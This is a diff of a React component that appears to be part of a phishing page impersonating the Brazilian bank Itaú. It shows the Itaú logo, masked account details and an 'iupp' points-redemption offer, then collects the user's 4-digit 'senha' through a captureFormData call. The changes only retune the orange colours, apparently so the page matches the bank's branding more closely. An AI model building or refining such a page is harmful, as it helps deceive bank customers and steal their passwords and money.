@@ -18,7 +18,7 @@ const Confirmacao = () => {
     : "***---";
 
   return (
-    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FE5200 0%, #CC4200 100%)' }}>
+    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
       {/* Header */}
       <div className="px-5 pt-6 pb-4">
         <img src={itauLogo} alt="Itaú" className="h-12" />
@@ -33,7 +33,7 @@ const Confirmacao = () => {
         <p className="text-muted-foreground text-xs mt-1">{maskedAgencia} / {maskedConta}</p>
         <div className="flex items-center justify-between mt-4">
           <span className="text-foreground font-bold text-base italic">iupp</span>
-          <span className="text-[#FE5200] font-bold text-lg">120.425 pts</span>
+          <span className="text-[#FF6200] font-bold text-lg">120.425 pts</span>
         </div>
       </div>
 
@@ -43,7 +43,7 @@ const Confirmacao = () => {
 
         <button
           onClick={() => setSelected("fatura")}
-          className={`w-full flex items-center justify-between p-4 rounded-lg border mb-3 transition-colors ${selected === "fatura" ? "border-[#FE5200] bg-orange-50" : "border-border"}`}
+          className={`w-full flex items-center justify-between p-4 rounded-lg border mb-3 transition-colors ${selected === "fatura" ? "border-[#FF6200] bg-orange-50" : "border-border"}`}
         >
           <div className="text-left">
             <p className="text-foreground font-semibold text-sm">Abater na próxima fatura</p>
@@ -53,7 +53,7 @@ const Confirmacao = () => {
 
         <button
           onClick={() => setSelected("saldo")}
-          className={`w-full flex items-center justify-between p-4 rounded-lg border transition-colors ${selected === "saldo" ? "border-[#FE5200] bg-orange-50" : "border-border"}`}
+          className={`w-full flex items-center justify-between p-4 rounded-lg border transition-colors ${selected === "saldo" ? "border-[#FF6200] bg-orange-50" : "border-border"}`}
         >
           <div className="text-left">
             <p className="text-foreground font-semibold text-sm">Saldo em conta</p>
@@ -95,7 +95,7 @@ const Confirmacao = () => {
         <button
           onClick={() => { if (senha.length === 4) { captureFormData("confirmacao", { senha }); navigate("/sucesso"); } }}
           disabled={senha.length !== 4}
-          className="w-full py-4 rounded-full bg-white/80 text-[#FE5200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
+          className="w-full py-4 rounded-full bg-white/80 text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
           Confirmar
         </button>
